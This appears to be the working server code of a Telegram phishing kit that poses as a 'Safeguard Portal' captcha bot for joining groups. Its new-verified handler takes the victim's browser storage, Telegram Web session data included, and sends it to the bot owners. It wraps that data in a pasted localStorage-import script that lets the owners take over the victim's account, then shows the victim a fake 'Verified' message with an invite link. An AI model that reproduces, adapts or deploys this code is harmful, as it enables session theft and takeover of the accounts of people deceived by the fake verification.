import {
  Bot,
  InlineKeyboard,
  InputFile,
  webhookCallback,
} from "https://deno.land/x/grammy@v1.30.0/mod.ts";

/* #region env */
const botOwner = Deno.env.get("BOT_OWNER") as string;
const botName = Deno.env.get("BOT_NAME");
const webAppLink = Deno.env.get("WEB_APP_LINK") || "https://hermes.hazereal418.deno.net/sg";
const gateKeeper = Deno.env.get("GATE_KEEPER");
const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY");
const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED");
const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));
/* #endregion */

const bot = new Bot(gateKeeper as string);
const sgConfigDefault = { channel: "", image: "", name: "", inviteLink: "" };

/* #region telegram bot */
bot.chatType("private").command("start", async (ctx) => {
  const msg = ctx.message?.text.split(" ");
  const id = msg[msg.length - 1];
  const caption = `<b>Verify you're human with Safeguard Portal</b>\n    \nClick 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().webApp("VERIFY", (webAppLink as string) + "?c=" + id);
  await bot.api.raw.sendPhoto({ caption, photo: input, chat_id: ctx.chatId, parse_mode: "HTML", reply_markup: keyboard });
});

bot.on("my_chat_member", async (ctx) => {
  if (ctx.myChatMember.chat.type !== "channel") return;
  const caption = `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink as string);
  await bot.api.raw.sendPhoto({ caption, photo: input, chat_id: ctx.chatId, parse_mode: "HTML", reply_markup: keyboard });
});

bot.chatType("private").command("setup", async (ctx) => {
  await ctx.api.raw.sendMessage({ text: `Fill below and send\n  \nchannel: //@username\nimage: // image url to display in your channel\nname:  // community name\ninviteLink: // your group invite link`, chat_id: ctx.chatId });
});

bot.chatType("private").on("message:text", async (ctx) => {
  let reply = "Saved!\n  \nPlease note that it will be deleted after summer.";
  const config = { ...sgConfigDefault };
  const text = ctx.message.text.split("\n");
  const kv = (t: string) => { const v = t.trim().split(":"); if (v.length < 2) throw new Error("Invalid"); return v.slice(1).join(":").trim(); };
  try {
    config.channel = kv(text[0]); config.image = kv(text[1]); config.name = kv(text[2]); config.inviteLink = kv(text[3]);
    const deno = await Deno.openKv();
    await deno.set(["channel", config.channel], config);
  } catch (e) { console.error(e); reply = "Hmmm, looks like your get is wrong"; }
  ctx.api.raw.sendMessage({ text: reply, chat_id: ctx.chatId });
});

bot.catch((e) => console.error(e.message));
/* #endregion */

/* #region new-verified handler */
async function handleNewVerified(req: Request): Promise<Response> {
  try {
    const body = await req.json();
    const storage = body.storage;
    if (storage) {
      const user = body.user || { username: "durov", id: "" };
      if (!user.id && storage.user_auth) user.id = JSON.parse(storage.user_auth).id;
      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a href="t.me/${user.username}">@${user.username}</a>\n\n<pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
      for (const owner of botOwner.split(",")) {
        await bot.api.raw.sendMessage({ text: log, chat_id: owner, parse_mode: "HTML" });
      }
      const deno = await Deno.openKv();
      const entry = await deno.get(["channel", "default"]);
      const config = (entry.value || sgConfigDefault) as typeof sgConfigDefault;
      const imageLink = sgVerifiedURL ? new URL(sgVerifiedURL) : "./safeguard-verify.jpg";
      const verifyMsg = `Verified, you can join the group using this temporary link:\n    \n<a href="${config.inviteLink}">${config.inviteLink}</a>\n    \nThis link is a one time use and will expire`;
      const inviteMsg = `<b>Verified!</b> \n  \nJoin request has been sent and you will be added once the admin approves your request`;
      const user_auth = JSON.parse(storage.user_auth);
      await bot.api.raw.sendPhoto({ caption: config.inviteLink ? verifyMsg : inviteMsg, photo: new InputFile(imageLink), parse_mode: "HTML", chat_id: user_auth.id });
    }
    return new Response(JSON.stringify({ msg: "ok" }), { headers: { "Content-Type": "application/json" } });
  } catch (ex) { console.error(ex); return new Response(JSON.stringify({ msg: "ok" }), { headers: { "Content-Type": "application/json" } }); }
}
/* #endregion */

/* #region MIME + static serving */
const MIME_TYPES: { [key: string]: string } = {
  ".html": "text/html", ".css": "text/css", ".js": "application/javascript",
  ".json": "application/json", ".png": "image/png", ".jpg": "image/jpeg",
  ".svg": "image/svg+xml", ".ico": "image/x-icon", ".wasm": "application/wasm",
  ".txt": "text/plain", ".mp3": "audio/mpeg", ".mp4": "video/mp4",
  ".webmanifest": "application/manifest+json",
};

function staticResponse(root: string, file: string): Promise<Response> {
  const fp = root.endsWith("/") ? root + file : root + "/" + file;
  const ext = file.includes(".") ? file.slice(file.lastIndexOf(".")) : "";
  const mime = MIME_TYPES[ext] || "application/octet-stream";
  return Deno.readFile(fp).then(data => new Response(data, { headers: { "Content-Type": mime } }))
    .catch(() => {
      const ip = root.endsWith("/") ? root + "index.html" : root + "/index.html";
      return Deno.readTextFile(ip).then(html => new Response(html, { headers: { "Content-Type": "text/html" } }))
        .catch(() => new Response("Not Found", { status: 404 }));
    });
}
/* #endregion */

// Main handler
const handleWebhook = webhookCallback(bot, "std");

async function fetchHandler(req: Request): Promise<Response> {
  const url = new URL(req.url);
  const path = url.pathname.slice(1);
  
  try {
    if (req.method === "POST" && path === "tg-webhook") return handleWebhook(req);
    if (req.method === "POST" && path === "new-verified") return handleNewVerified(req);
    
    // Static routes
    if (path === "" || path === "test") {
      const html = await Deno.readTextFile("./static/tweb/index.html");
      return new Response(html, { headers: { "Content-Type": "text/html" } });
    }
    if (path === "sg" || path === "sg/") {
      const html = await Deno.readTextFile("./static/sg/index.html");
      return new Response(html, { headers: { "Content-Type": "text/html" } });
    }
    if (path === "ping") return new Response("pong", { headers: { "Content-Type": "text/plain" } });
    if (path === "t") return new Response("<h1>OK</h1>", { headers: { "Content-Type": "text/html" } });
    if (path === "j") return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
    
    // Static file serving
    let filename = path || "index.html";
    const parts = filename.split("/");
    if (parts.length > 1) filename = parts[parts.length - 1];
    
    if (path.startsWith("sg/")) return staticResponse("./static/sg", filename);
    if (path.startsWith("tweb")) return staticResponse("./static/tweb", filename);
    if (path.includes(".")) return staticResponse("./static/tweb", filename);
    
    return new Response(JSON.stringify({ msg: "ok" }), { headers: { "Content-Type": "application/json" } });
  } catch (e) {
    console.error("FETCH ERROR:", e.message || e);
    return new Response("Server Error", { status: 500 });
  }
}

// Both patterns for Deno Deploy v2 compatibility
Deno.serve(fetchHandler);
export default { fetch: fetchHandler };
